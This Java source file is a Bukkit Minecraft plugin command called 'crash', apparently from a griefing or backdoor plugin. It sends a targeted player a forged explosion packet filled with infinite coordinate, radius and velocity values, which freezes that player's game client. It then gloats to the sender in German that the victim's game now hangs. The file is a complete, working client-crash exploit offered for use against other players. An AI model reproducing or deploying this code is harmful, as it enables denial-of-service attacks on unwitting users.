package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class Command_CRASH extends CommandBase {

    public Command_CRASH() {
        super("crash", "<Spieler>" + " §d| " + ChatColor.GRAY + "Minecraft hängt", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Player vic = Bukkit.getPlayer(args[1]);
                ((CraftPlayer) vic).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, Collections.EMPTY_LIST, new Vec3D(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY)));
                p.sendMessage(Start.INSTANCE.chatPrefix + "Sein Spiel hängt jetzt :D");
            } catch (Exception ignored) {
            }
        }
    }

}
